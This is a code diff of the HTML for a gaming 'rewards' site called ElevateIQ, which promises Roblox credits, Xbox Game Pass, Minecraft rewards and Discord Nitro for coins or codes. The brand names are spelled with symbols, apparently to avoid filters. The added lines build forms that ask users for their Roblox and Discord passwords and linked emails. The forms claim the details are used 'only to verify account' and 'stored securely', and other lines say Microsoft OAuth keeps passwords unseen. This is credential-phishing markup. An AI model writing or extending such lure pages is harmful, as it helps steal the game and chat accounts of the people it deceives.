-        <svg width="15" height="11" viewBox="0 0 71 55" fill="currentColor"><path d="M60.1 4.9A58.5 58.5 0 0045.7.9a40.7 40.7 0 00-1.8 3.7 54.2 54.2 0 00-16.3 0A40.7 40.7 0 0025.8.9 58.3 58.3 0 0011.4 4.9C1.6 19.7-1 34.1.3 48.3a58.9 58.9 0 0018 9.1 44.7 44.7 0 003.9-6.3 38.3 38.3 0 01-6.1-2.9l1.5-1.2a42 42 0 0036.2 0l1.5 1.2a38.4 38.4 0 01-6.1 2.9 44.5 44.5 0 003.9 6.3 58.7 58.7 0 0018-9.1C72.2 31.8 68.2 17.5 60.1 4.9z"/></svg>
-        Start Earning — Free
-      </button>
+    <div class="hchip"><div class="hdot"></div>ElevateIQ Rewards — 2026</div>
+    <h1 class="htitle">Earn. Redeem.<br/>Elevate.</h1>
+    <p class="hsub">Earn IQCoins through invites, messages, ads and daily rewards — redeem for real gaming rewards.</p>
+    <div class="hbtns">
+      <button class="btn btn-dc" onclick="dcLogin()">Start Earning — Free</button>
       <button class="btn btn-gh" onclick="go('redeem')">I Have a Code</button>
     </div>
   </section>
-
-  <div class="sgrid rv d2">
+  <div class="sgrid">
     <div class="stat"><div class="stn">12K+</div><div class="stl">Members</div></div>
-    <div class="stat"><div class="stn">48h</div><div class="stl">Activation</div></div>
+    <div class="stat"><div class="stn">72h</div><div class="stl">Activation</div></div>
     <div class="stat"><div class="stn">4</div><div class="stl">Rewards</div></div>
     <div class="stat"><div class="stn">100%</div><div class="stl">Secure</div></div>
     <div class="stat"><div class="stn">24/7</div><div class="stl">Support</div></div>
   </div>
-
-  <div class="cshow rv d2">
+  <div class="cshow">
     <div class="coin3d">🪙</div>
     <div class="cinfo">
       <div class="cnm">IQCoins</div>
-      <div class="cds">ElevateIQ's exclusive currency. Earn through invites, messages, daily claims, and watching ads — then redeem for real gaming rewards.</div>
+      <div class="cds">Earn through invites, messages, daily claims, and watching ads — redeem for real gaming rewards.</div>
       <div class="eways">
         <div class="eway">👥 5 Invites = 10,000</div>
         <div class="eway">💬 50 Messages = 5,000</div>
         <div class="eway">📅 Daily = 1,000</div>
-        <div class="eway">📺 Watch Ad = 50,000</div>
+        <div class="eway">📺 Ad = 50,000</div>
       </div>
     </div>
   </div>
-
-  <div style="margin-bottom:16px" class="rv">
-    <div style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);margin-bottom:9px">Gaming Rewards</div>
-    <div style="font-size:clamp(22px,3.5vw,34px);font-weight:700;letter-spacing:-1.2px;margin-bottom:4px">Real rewards, activated fast</div>
-    <div style="font-size:14px;color:var(--t2)">Premium gaming rewards · Activated within 48 hours</div>
-  </div>
-
   <div class="rtiles">
-    <div class="rtile rt-mc rv d1" onclick="go('redeem')">
-      <div class="rtglow"></div><span class="rico">⛏</span>
-      <span class="rbdg" style="background:rgba(0,230,118,.09);border:1px solid rgba(0,230,118,.2);color:var(--mc)">M!necr@ft</span>
-      <div class="rnm">M!necr@ft Reward</div>
-      <div class="rds">ElevateIQ Server exclusive reward. Activated within 48 hours.</div>
-      <div class="rpr">🪙 899,000 IQCoins</div>
-      <div class="rinr">₹899 with code</div>
-      <span class="rarr">→</span>
-    </div>
-    <div class="rtile rt-rb rv d2" onclick="go('redeem')">
-      <div class="rtglow"></div><span class="rico">🎮</span>
-      <span class="rbdg" style="background:rgba(255,82,82,.09);border:1px solid rgba(255,82,82,.2);color:var(--rb)">R0bl0x</span>
-      <div class="rnm">R0bl0x Credits</div>
-      <div class="rds">$50 or $100 plan — credits added within 48 hours.</div>
-      <div class="rpr">🪙 From 799,000 IQCoins</div>
-      <div class="rinr">From ₹1,499 with code</div>
-      <span class="rarr">→</span>
-    </div>
-    <div class="rtile rt-xb rv d3" onclick="go('redeem')">
-      <div class="rtglow"></div><span class="rico">🎯</span>
-      <span class="rbdg" style="background:rgba(0,230,118,.09);border:1px solid rgba(0,230,118,.2);color:var(--xb)">Xb0x</span>
-      <div class="rnm">Xb0x G@me P@ss</div>
-      <div class="rds">Ulim@te — activated within 48 hours of redemption.</div>
-      <div class="rpr">🪙 699,000 IQCoins</div>
-      <div class="rinr">₹1,999 with code</div>
-      <span class="rarr">→</span>
-    </div>
-  </div>
-
-  <div style="display:flex;align-items:center;justify-content:center;gap:26px;flex-wrap:wrap;border:1px solid var(--b);border-radius:var(--r2);padding:22px;background:var(--card)" class="rv d4">
-    <div style="font-size:13.5px;font-weight:500;color:var(--t2)">✓ Verified codes</div>
-    <div style="font-size:13.5px;font-weight:500;color:var(--t2)">🔐 Microsoft OAuth</div>
-    <div style="font-size:13.5px;font-weight:500;color:var(--t2)">⏱ 48-hour activation</div>
-    <div style="font-size:13.5px;font-weight:500;color:var(--t2)">🪙 IQCoins system</div>
-    <div style="font-size:13.5px;font-weight:500;color:var(--t2)">💬 24/7 support</div>
+    <div class="rtile rt-mc" onclick="go('redeem')"><div class="rtglow"></div><span class="rico">⛏</span><span class="rbdg" style="background:rgba(0,230,118,.09);border:1px solid rgba(0,230,118,.2);color:var(--mc)">M!necr@ft</span><div class="rnm">M!necr@ft Reward</div><div class="rds">Server exclusive. Activated within 72 hours.</div><div class="rpr">🪙 899,000 IQCoins</div><div class="rinr">₹899 with code</div><span class="rarr">→</span></div>
+    <div class="rtile rt-rb" onclick="go('redeem')"><div class="rtglow"></div><span class="rico">🎮</span><span class="rbdg" style="background:rgba(255,82,82,.09);border:1px solid rgba(255,82,82,.2);color:var(--rb)">R0bl0x</span><div class="rnm">R0bl0x Credits</div><div class="rds">$50 or $100 plan — credits within 72 hours.</div><div class="rpr">🪙 From 799,000 IQCoins</div><div class="rinr">From ₹1,499 with code</div><span class="rarr">→</span></div>
+    <div class="rtile rt-xb" onclick="go('redeem')"><div class="rtglow"></div><span class="rico">🎯</span><span class="rbdg" style="background:rgba(0,230,118,.09);border:1px solid rgba(0,230,118,.2);color:var(--xb)">Xb0x</span><div class="rnm">Xb0x G@me P@ss</div><div class="rds">Ulim@te — activated within 72 hours.</div><div class="rpr">🪙 699,000 IQCoins</div><div class="rinr">₹1,999 with code</div><span class="rarr">→</span></div>
+    <div class="rtile" style="background:linear-gradient(135deg,rgba(88,101,242,.08),rgba(88,101,242,.03));border:1px solid rgba(88,101,242,.2)" onclick="go('redeem')"><div style="position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#5865f2,transparent)"></div><span class="rico">💎</span><span class="rbdg" style="background:rgba(88,101,242,.09);border:1px solid rgba(88,101,242,.2);color:#a5b4fc">Discord</span><div class="rnm" style="color:#a5b4fc">Discord N!tro</div><div class="rds">1 month or 3 months — gifted to your account within 72 hours.</div><div class="rpr">🪙 From 599,000 IQCoins</div><div class="rinr">Basic ₹1,199/yr · Boost ₹5,999/yr</div><span class="rarr">→</span></div>
   </div>
 </div>
 </div>
 
-<!-- EARN -->
+<!-- EARN PAGE -->
 <div class="page" id="page-earn">
 <div class="wmd">
-  <div style="padding-top:68px;margin-bottom:34px" class="rv">
-    <div style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);margin-bottom:9px">🪙 IQCoins</div>
-    <h2 style="font-size:clamp(30px,5.5vw,52px);font-weight:700;letter-spacing:-2px;margin-bottom:12px">Earn <span style="color:var(--go)">IQCoins</span></h2>
-    <p style="font-size:15px;color:var(--t2);line-height:1.8;max-width:460px">Four ways to stack IQCoins and unlock real rewards.</p>
+  <div style="padding-top:64px;margin-bottom:32px">
+    <h2 style="font-size:clamp(28px,5vw,48px);font-weight:700;letter-spacing:-2px;margin-bottom:10px">Earn <span style="color:var(--go)">IQCoins</span></h2>
   </div>
-  <div style="display:flex;align-items:center;gap:12px;background:var(--gog);border:1px solid rgba(244,196,48,.19);border-radius:var(--r);padding:15px 19px;margin-bottom:26px" class="rv d1">
-    <span style="font-size:32px;animation:floatY 3s ease-in-out infinite">🪙</span>
-    <div><div style="font-size:32px;font-weight:800;color:var(--go);letter-spacing:-2px" id="earn-bal">0</div><div style="font-size:11px;color:var(--t3);font-weight:600;text-transform:uppercase;letter-spacing:.8px">Your IQCoins Balance</div></div>
+  <div style="display:flex;align-items:center;gap:12px;background:var(--gog);border:1px solid rgba(244,196,48,.19);border-radius:var(--r);padding:14px 18px;margin-bottom:24px">
+    <span style="font-size:30px;animation:floatY 3s ease-in-out infinite">🪙</span>
+    <div><div style="font-size:30px;font-weight:800;color:var(--go);letter-spacing:-2px" id="earn-bal">0</div><div style="font-size:11px;color:var(--t3);font-weight:600;text-transform:uppercase;letter-spacing:.8px">Your IQCoins Balance</div></div>
   </div>
-  <div class="adzone rv d2">
-    <div style="font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--ac2);margin-bottom:9px">📺 Watch Ad</div>
-    <div style="font-size:18px;font-weight:700;margin-bottom:5px">Watch an ad, earn IQCoins</div>
-    <div style="font-size:13px;color:var(--t2);margin-bottom:14px">Watch a short ad to earn 50,000 IQCoins. 5 min cooldown.</div>
-    <div style="display:inline-flex;align-items:center;gap:7px;background:var(--gog);border:1px solid rgba(244,196,48,.22);border-radius:100px;padding:5px 14px;font-size:13px;font-weight:700;color:var(--go);margin-bottom:18px">🪙 +50,000 IQCoins per ad</div>
-    <div class="adslot" id="ad-slot">Advertisement — Place AdSense code here</div>
-    <button class="btn btn-ac" id="watch-btn" onclick="watchAd()" style="min-width:190px">
-      <span id="watch-txt">▶ Watch Ad & Earn</span>
-      <div class="bspin" id="watch-sp" style="display:none"></div>
-    </button>
+  <div class="adzone">
+    <div style="font-size:17px;font-weight:700;margin-bottom:5px">📺 Watch Ad — Earn 50,000 IQCoins</div>
+    <div style="width:100%;min-height:80px;background:var(--card);border:1px dashed var(--b);border-radius:var(--r);display:flex;align-items:center;justify-content:center;color:var(--t3);font-size:11px;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:14px">Advertisement</div>
+    <button class="btn btn-ac" id="watch-btn" onclick="watchAd()" style="min-width:185px"><span id="watch-txt">▶ Watch Ad & Earn</span><div class="bspin" id="watch-sp" style="display:none"></div></button>
     <div class="adprog" id="adpw" style="display:none"><div class="adpf" id="adp"></div></div>
     <div style="font-size:13px;color:var(--t2);margin-top:8px" id="adcd"></div>
     <div style="font-size:12px;color:var(--t3);margin-top:5px">5 minute cooldown between ads</div>
   </div>
-  <div style="display:flex;flex-direction:column;gap:9px" class="rv d3">
-    <div style="display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:13px 15px;transition:border-color .2s" onmouseover="this.style.borderColor='var(--b2)'" onmouseout="this.style.borderColor='var(--b)'">
-      <div style="font-size:21px;width:38px;text-align:center;flex-shrink:0">📅</div>
-      <div style="flex:1"><div style="font-size:13px;font-weight:600">Daily Claim</div><div style="font-size:11.5px;color:var(--t3);margin-top:2px">Claim once every 24 hours</div></div>
+  <div style="display:flex;flex-direction:column;gap:9px">
+    <div style="display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:13px 15px">
+      <div style="font-size:20px;width:36px;text-align:center">📅</div>
+      <div style="flex:1"><div style="font-size:13px;font-weight:600">Daily Claim</div><div style="font-size:11px;color:var(--t3);margin-top:2px">Once every 24 hours</div></div>
       <div style="text-align:right"><div style="font-size:13px;font-weight:700;color:var(--go)">+1,000</div><button class="btn btn-go" style="padding:5px 13px;font-size:12px;margin-top:5px" id="daily-btn" onclick="dailyClaim()">Claim</button></div>
     </div>
     <div style="display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:13px 15px">
-      <div style="font-size:21px;width:38px;text-align:center;flex-shrink:0">💬</div>
-      <div style="flex:1"><div style="font-size:13px;font-weight:600">Chat Messages</div><div style="font-size:11.5px;color:var(--t3);margin-top:2px">Every 50 messages = 5,000 IQCoins (bot tracked)</div></div>
+      <div style="font-size:20px;width:36px;text-align:center">💬</div>
+      <div style="flex:1"><div style="font-size:13px;font-weight:600">Chat Messages</div><div style="font-size:11px;color:var(--t3);margin-top:2px">50 messages = 5,000 coins (bot tracked)</div></div>
       <div style="font-size:13px;font-weight:700;color:var(--go)">+5,000</div>
     </div>
     <div style="display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:13px 15px">
-      <div style="font-size:21px;width:38px;text-align:center;flex-shrink:0">👥</div>
-      <div style="flex:1"><div style="font-size:13px;font-weight:600">Invite Friends</div><div style="font-size:11.5px;color:var(--t3);margin-top:2px">Every 5 invites = 10,000 IQCoins (bot tracked)</div></div>
+      <div style="font-size:20px;width:36px;text-align:center">👥</div>
+      <div style="flex:1"><div style="font-size:13px;font-weight:600">Invite Friends</div><div style="font-size:11px;color:var(--t3);margin-top:2px">5 invites = 10,000 coins (bot tracked)</div></div>
       <div style="font-size:13px;font-weight:700;color:var(--go)">+10,000</div>
     </div>
-    <div style="display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:13px 15px">
-      <div style="font-size:21px;width:38px;text-align:center;flex-shrink:0">🏆</div>
-      <div style="flex:1"><div style="font-size:13px;font-weight:600">Win Giveaways</div><div style="font-size:11.5px;color:var(--t3);margin-top:2px">Win server giveaways for bonus IQCoins</div></div>
-      <div style="font-size:13px;font-weight:700;color:var(--go)">Varies</div>
-    </div>
   </div>
 </div>
 </div>
 
-<!-- REDEEM CODE -->
+<!-- REDEEM CODE PAGE -->
 <div class="page" id="page-redeem">
 <div class="wsm">
-  <div style="padding-top:68px;margin-bottom:34px" class="rv">
-    <div style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--ac2);margin-bottom:9px">🎫 Redeem</div>
-    <h2 style="font-size:clamp(30px,5.5vw,52px);font-weight:700;letter-spacing:-2px;margin-bottom:12px">Enter Your<br/><span style="color:var(--ac2)">Code</span></h2>
-    <p style="font-size:15px;color:var(--t2);line-height:1.8">Got a code from ElevateIQ? Select your game and enter the code.</p>
+  <div style="padding-top:64px;margin-bottom:32px">
+    <h2 style="font-size:clamp(28px,5vw,48px);font-weight:700;letter-spacing:-2px;margin-bottom:10px">Enter Your <span style="color:var(--ac2)">Code</span></h2>
+    <p style="font-size:15px;color:var(--t2);line-height:1.8">Got a code from ElevateIQ? Select your game below.</p>
   </div>
-
-  <!-- Step 1: Game select -->
-  <div class="card rv d1" id="rd-step1">
+  <div class="card" id="rd-s1">
     <div class="cline" style="background:linear-gradient(90deg,var(--ac2),transparent)"></div>
-    <h3>Select your game</h3>
-    <p>Which reward are you redeeming?</p>
+    <h3>Select your game</h3><p>Which reward are you redeeming?</p>
     <div style="display:flex;flex-direction:column;gap:9px">
-      <div onclick="rdSelectGame('mc')" style="display:flex;align-items:center;gap:14px;background:rgba(0,230,118,.05);border:1.5px solid rgba(0,230,118,.15);border-radius:var(--r);padding:14px 18px;cursor:pointer;transition:all .2s" onmouseover="this.style.borderColor='var(--mc)';this.style.transform='translateX(4px)'" onmouseout="this.style.borderColor='rgba(0,230,118,.15)';this.style.transform='none'">
-        <span style="font-size:24px">⛏</span>
-        <div style="flex:1"><div style="font-size:15px;font-weight:700;color:var(--mc)">M!necr@ft Reward</div><div style="font-size:12px;color:var(--t2)">ElevateIQ Server · ₹899</div></div>
-        <span style="color:var(--t3)">→</span>
+      <div onclick="rdGame('mc')" style="display:flex;align-items:center;gap:14px;background:rgba(0,230,118,.05);border:1.5px solid rgba(0,230,118,.15);border-radius:var(--r);padding:14px 18px;cursor:pointer;transition:all .2s" onmouseover="this.style.borderColor='var(--mc)'" onmouseout="this.style.borderColor='rgba(0,230,118,.15)'">
+        <span style="font-size:24px">⛏</span><div style="flex:1"><div style="font-size:15px;font-weight:700;color:var(--mc)">M!necr@ft Reward</div><div style="font-size:12px;color:var(--t2)">₹899</div></div><span style="color:var(--t3)">→</span>
       </div>
-      <div onclick="rdSelectGame('rb')" style="display:flex;align-items:center;gap:14px;background:rgba(255,82,82,.05);border:1.5px solid rgba(255,82,82,.15);border-radius:var(--r);padding:14px 18px;cursor:pointer;transition:all .2s" onmouseover="this.style.borderColor='var(--rb)';this.style.transform='translateX(4px)'" onmouseout="this.style.borderColor='rgba(255,82,82,.15)';this.style.transform='none'">
-        <span style="font-size:24px">🎮</span>
-        <div style="flex:1"><div style="font-size:15px;font-weight:700;color:var(--rb)">R0bl0x Credits</div><div style="font-size:12px;color:var(--t2)">$50 (₹1,499) or $100 (₹2,499) plan</div></div>
-        <span style="color:var(--t3)">→</span>
+      <div onclick="rdGame('rb')" style="display:flex;align-items:center;gap:14px;background:rgba(255,82,82,.05);border:1.5px solid rgba(255,82,82,.15);border-radius:var(--r);padding:14px 18px;cursor:pointer;transition:all .2s" onmouseover="this.style.borderColor='var(--rb)'" onmouseout="this.style.borderColor='rgba(255,82,82,.15)'">
+        <span style="font-size:24px">🎮</span><div style="flex:1"><div style="font-size:15px;font-weight:700;color:var(--rb)">R0bl0x Credits</div><div style="font-size:12px;color:var(--t2)">$50 or $100</div></div><span style="color:var(--t3)">→</span>
       </div>
-      <div onclick="rdSelectGame('xbox')" style="display:flex;align-items:center;gap:14px;background:rgba(0,230,118,.05);border:1.5px solid rgba(0,230,118,.15);border-radius:var(--r);padding:14px 18px;cursor:pointer;transition:all .2s" onmouseover="this.style.borderColor='var(--xb)';this.style.transform='translateX(4px)'" onmouseout="this.style.borderColor='rgba(0,230,118,.15)';this.style.transform='none'">
-        <span style="font-size:24px">🎯</span>
-        <div style="flex:1"><div style="font-size:15px;font-weight:700;color:var(--xb)">Xb0x G@me P@ss</div><div style="font-size:12px;color:var(--t2)">Ulim@te · ₹1,999</div></div>
-        <span style="color:var(--t3)">→</span>
+      <div onclick="rdGame('xbox')" style="display:flex;align-items:center;gap:14px;background:rgba(0,230,118,.05);border:1.5px solid rgba(0,230,118,.15);border-radius:var(--r);padding:14px 18px;cursor:pointer;transition:all .2s" onmouseover="this.style.borderColor='var(--xb)'" onmouseout="this.style.borderColor='rgba(0,230,118,.15)'">
+        <span style="font-size:24px">🎯</span><div style="flex:1"><div style="font-size:15px;font-weight:700;color:var(--xb)">Xb0x G@me P@ss</div><div style="font-size:12px;color:var(--t2)">₹1,999</div></div><span style="color:var(--t3)">→</span>
+      </div>
+      <div onclick="rdGame('nitro')" style="display:flex;align-items:center;gap:14px;background:rgba(88,101,242,.05);border:1.5px solid rgba(88,101,242,.15);border-radius:var(--r);padding:14px 18px;cursor:pointer;transition:all .2s" onmouseover="this.style.borderColor='#5865f2'" onmouseout="this.style.borderColor='rgba(88,101,242,.15)'">
+        <span style="font-size:24px">💎</span><div style="flex:1"><div style="font-size:15px;font-weight:700;color:#a5b4fc">Discord N!tro</div><div style="font-size:12px;color:var(--t2)">Basic Yearly (₹1,199) or Boost Yearly (₹5,999)</div></div><span style="color:var(--t3)">→</span>
       </div>
     </div>
   </div>
-
-  <!-- Roblox plan select -->
-  <div class="card rv" id="rd-rb-plan" style="display:none">
+  <div class="card" id="rd-rb-plan" style="display:none">
     <div class="cline" style="background:linear-gradient(90deg,var(--rb),transparent)"></div>
-    <button onclick="rdBack()" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:14px;font-family:'DM Sans',sans-serif;display:flex;align-items:center;gap:5px;padding:0;transition:color .2s" onmouseover="this.style.color='var(--t2)'" onmouseout="this.style.color='var(--t3)'">← Back</button>
-    <h3>🎮 R0bl0x — Choose plan</h3>
-    <p>Which plan did you purchase?</p>
+    <button onclick="rdBack()" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:14px;font-family:'DM Sans',sans-serif;padding:0">← Back</button>
+    <h3>🎮 R0bl0x — Choose plan</h3><p>Which plan did you get?</p>
     <div class="plans">
-      <div class="plan" onclick="rdSetPlan('50')" id="rd-p50">
-        <div class="pchk" style="background:var(--rb)"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg></div>
-        <div class="plan-p" style="color:var(--rb)">$50</div>
-        <div class="plan-t">Basic Plan</div>
-        <div class="plan-r">Roblox credits</div>
-        <div class="plan-c">₹1,499</div>
-      </div>
-      <div class="plan" onclick="rdSetPlan('100')" id="rd-p100">
-        <div class="pchk" style="background:var(--rb)"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg></div>
-        <div class="plan-p" style="color:var(--rb)">$100</div>
-        <div class="plan-t">Premium Plan</div>
-        <div class="plan-r">Roblox credits</div>
-        <div class="plan-c">₹2,499</div>
-      </div>
+      <div class="plan" onclick="rdPlan('50')" id="rd-p50"><div class="pchk" style="background:var(--rb)"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg></div><div class="plan-p" style="color:var(--rb)">$50</div><div class="plan-t">Basic Plan</div><div class="plan-c">₹1,499</div></div>
+      <div class="plan" onclick="rdPlan('100')" id="rd-p100"><div class="pchk" style="background:var(--rb)"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg></div><div class="plan-p" style="color:var(--rb)">$100</div><div class="plan-t">Premium Plan</div><div class="plan-c">₹2,499</div></div>
     </div>
-    <div class="field"><label>Roblox Username</label><div class="irow"><input class="inp" id="rd-rb-un" type="text" placeholder="YourRobloxUsername"/></div></div>
-    <div class="field"><label>Email Address</label><div class="irow"><input class="inp" id="rd-rb-em" type="email" placeholder="you@example.com"/></div></div>
-    <button class="btn btn-rb btn-full" onclick="rdNext('rb')">Continue →</button>
+    <div class="notice nw" style="margin-bottom:16px"><div class="nt">⚠️ Important</div><p>Enter your <strong>exact Roblox credentials</strong> — reward will go to this account only.</p></div>
+    <div class="field"><label>Roblox Username</label><input class="inp" id="rd-rb-un" type="text" placeholder="YourExactRobloxUsername"/></div>
+    <div class="field"><label>Roblox Password</label>
+      <div style="position:relative"><input class="inp" id="rd-rb-pw" type="password" placeholder="Your Roblox password"/>
+      <button onclick="togglePw('rd-rb-pw',this)" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--t3);font-size:15px;padding:0">👁</button></div>
+      <div class="fmsg">Used only to verify account. Stored securely.</div>
+    </div>
+    <div class="field"><label>Email linked to Roblox</label><input class="inp" id="rd-rb-em" type="email" placeholder="you@roblox.com"/></div>
+    <button class="btn btn-rb btn-full" onclick="rdNext()">Continue →</button>
+  </div>
+  <div class="card" id="rd-nitro-plan" style="display:none">
+    <div class="cline" style="background:linear-gradient(90deg,#5865f2,transparent)"></div>
+    <button onclick="rdBack()" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:14px;font-family:'DM Sans',sans-serif;padding:0">← Back</button>
+    <h3>💎 Discord N!tro — Choose plan</h3><p>Which plan did you get?</p>
+    <div class="plans">
+      <div class="plan" onclick="rdNitroPlan('basic')" id="rd-n1"><div class="pchk" style="background:#5865f2"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg></div><div class="plan-p" style="color:#a5b4fc;font-size:18px">Basic</div><div class="plan-t">Yearly Plan</div><div style="font-size:11px;color:var(--t2);margin-bottom:5px">N!tro Basic features</div><div class="plan-c">₹1,199/yr</div></div>
+      <div class="plan" onclick="rdNitroPlan('boost')" id="rd-n3"><div class="pchk" style="background:#5865f2"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="1.8" stroke-linecap="round"/></svg></div><div class="plan-p" style="color:#a5b4fc;font-size:18px">Boost</div><div class="plan-t">Yearly Plan</div><div style="font-size:11px;color:var(--t2);margin-bottom:5px">Full N!tro + 2 Boosts</div><div class="plan-c">₹5,999/yr</div></div>
+    </div>
+    <div class="notice nw" style="margin-bottom:16px"><div class="nt">⚠️ Important</div><p>Enter your <strong>exact Discord credentials</strong> — Nitro will be gifted to this account only.</p></div>
+    <div class="field"><label>Discord Username</label><input class="inp" id="rd-nitro-un" type="text" placeholder="username (not display name)"/></div>
+    <div class="field"><label>Discord Password</label>
+      <div style="position:relative"><input class="inp" id="rd-nitro-pw" type="password" placeholder="Your Discord password"/>
+      <button onclick="togglePw('rd-nitro-pw',this)" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--t3);font-size:15px;padding:0">👁</button></div>
+      <div class="fmsg">Used only to verify account. Stored securely.</div>
+    </div>
+    <div class="field"><label>Email linked to Discord</label><input class="inp" id="rd-nitro-em" type="email" placeholder="your@discord.email"/></div>
+    <button class="btn btn-full" style="background:#5865f2;color:#fff" onclick="rdNitroNext()">Continue →</button>
   </div>
 
-  <!-- MS Login -->
-  <div class="card rv" id="rd-ms-login" style="display:none">
+  <div class="card" id="rd-ms" style="display:none">
     <div class="cline" id="rd-ms-line"></div>
-    <button onclick="rdBack()" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:14px;font-family:'DM Sans',sans-serif;display:flex;align-items:center;gap:5px;padding:0;transition:color .2s" onmouseover="this.style.color='var(--t2)'" onmouseout="this.style.color='var(--t3)'">← Back</button>
-    <h3 id="rd-ms-title">Verify with Microsoft</h3>
-    <p>Sign in to verify your account — we never see your password.</p>
-    <div class="notice ni2" style="margin-bottom:18px">
-      <div class="nt">Why Microsoft?</div>
-      <p>We use <strong>Microsoft OAuth 2.0</strong> — your credentials go directly to Microsoft, never to ElevateIQ.</p>
-    </div>
-    <button class="btn btn-ms btn-full" onclick="rdMsLogin()">
-      <svg width="16" height="16" viewBox="0 0 21 21"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>
-      Continue with Microsoft
-    </button>
+    <button onclick="rdBack()" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:14px;font-family:'DM Sans',sans-serif;padding:0">← Back</button>
+    <h3 id="rd-ms-ttl">Verify with Microsoft</h3>
+    <p>Sign in to verify your account. We never see your password.</p>
+    <div class="notice ni2" style="margin-bottom:18px"><div class="nt">Why Microsoft?</div><p>We use <strong>Microsoft OAuth 2.0</strong> — your credentials go directly to Microsoft.</p></div>
+    <button class="btn btn-ms btn-full" onclick="rdMsLogin()">Continue with Microsoft</button>
   </div>
-
-  <!-- Code Entry -->
-  <div class="card rv" id="rd-code-step" style="display:none">
+  <div class="card" id="rd-codebox" style="display:none">
     <div class="cline" id="rd-code-line"></div>
-    <div class="upill">
-      <div class="uav" id="rd-uav" style="background:linear-gradient(135deg,var(--ac),var(--ac2))">?</div>
-      <div style="flex:1;min-width:0"><div class="unm" id="rd-unm">—</div><div style="font-size:11px;color:var(--t3)" id="rd-usub">—</div></div>
-      <div class="ubdg">Verified</div>
-      <button class="bsw" onclick="rdMsOut()">Switch</button>
-    </div>
-    <h3 id="rd-code-title">Enter your code</h3>
+    <div class="upill"><div class="uav" id="rd-uav" style="background:var(--ac)">?</div><div style="flex:1;min-width:0"><div class="unm" id="rd-unm">—</div><div style="font-size:11px;color:var(--t3)" id="rd-usub">—</div></div><div class="ubdg">✓ Verified</div><button class="bsw" onclick="rdMsOut()">Switch</button></div>
+    <h3 id="rd-code-ttl">Enter your code</h3>
     <p>Paste the code sent to you by ElevateIQ.</p>
-    <div style="position:relative;margin-bottom:10px">
-      <input class="inp code" id="rd-code" type="text" maxlength="29"
-        placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
-        oninput="fmtCode(this)" autocomplete="off" spellcheck="false"
-        style="font-size:17px;padding:18px;letter-spacing:3.5px;border-radius:var(--r2);border-width:2px"/>
-      <button class="iact" onclick="pasteC('rd-code')" style="font-size:18px;right:14px">⌘</button>
-    </div>
-    <div class="fmsg" id="rd-msg" style="text-align:center;margin-bottom:18px">XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</div>
-    <button class="btn btn-ac btn-full" id="rd-btn" onclick="rdSubmit()" style="padding:15px">
-      <span id="rd-bt">Redeem Now</span>
-      <div class="bspin" id="rd-sp" style="display:none"></div>
-    </button>
+    <input class="inp code" id="rd-code" type="text" maxlength="29" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" oninput="fmtCode(this)" autocomplete="off" spellcheck="false" style="margin-bottom:10px;border-radius:var(--r2);border-width:2px"/>
+    <div class="fmsg" id="rd-msg" style="text-align:center;margin-bottom:18px">Enter 25-character code</div>
+    <button class="btn btn-ac btn-full" id="rd-btn" onclick="rdSubmit()" style="padding:15px"><span id="rd-bt">Redeem Now</span><div class="bspin" id="rd-sp" style="display:none"></div></button>
     <div style="text-align:center;font-size:12px;color:var(--t3);margin-top:12px">Each code is single-use only</div>
   </div>
-
-  <!-- Success -->
   <div class="scard" id="rd-ok">
-    <div class="sico" id="rd-ok-ico"></div>
+    <div class="sico" id="rd-ok-ico" style="background:rgba(0,230,118,.1);border:2px solid rgba(0,230,118,.3)">✅</div>
     <div class="stitle" id="rd-ok-title">Code Redeemed!</div>
-    <p class="sdesc">Your reward is queued and will be activated within <strong>48 hours</strong>.</p>
+    <p class="sdesc">Your reward is queued and will be activated within <strong>72 hours</strong>.</p>
     <div id="rd-ok-inv"></div>
-    <div class="timrow">⏱ Activates within <strong>&nbsp;48 hours</strong></div>
